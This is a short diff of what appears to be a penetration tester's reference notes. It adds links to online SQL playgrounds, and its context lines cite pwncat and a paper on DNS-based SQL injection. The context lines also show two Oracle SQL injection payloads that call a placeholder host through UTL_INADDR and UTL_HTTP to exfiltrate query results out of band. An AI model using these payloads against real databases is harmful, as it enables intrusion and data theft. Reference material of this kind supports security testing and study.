@@ -1073,6 +1073,15 @@ https://github.com/calebstewart/pwncat
 https://arxiv.org/abs/1303.3047
 <br># This paper describes an advanced SQL injection technique where DNS resolution process is exploited for retrieval of malicious SQL query results.
 
+https://livesql.oracle.com
+<br># Learn and share SQL. Running on Oracle Database 19c.
+
+https://www.db-fiddle.com
+<br># An online SQL database playground for testing, debugging and sharing SQL snippets.
+
+http://sqlfiddle.com/
+<br># Application for testing and sharing SQL queries.
+
 <br># Oracle
 <br>```'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'```
 <br>```'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'```
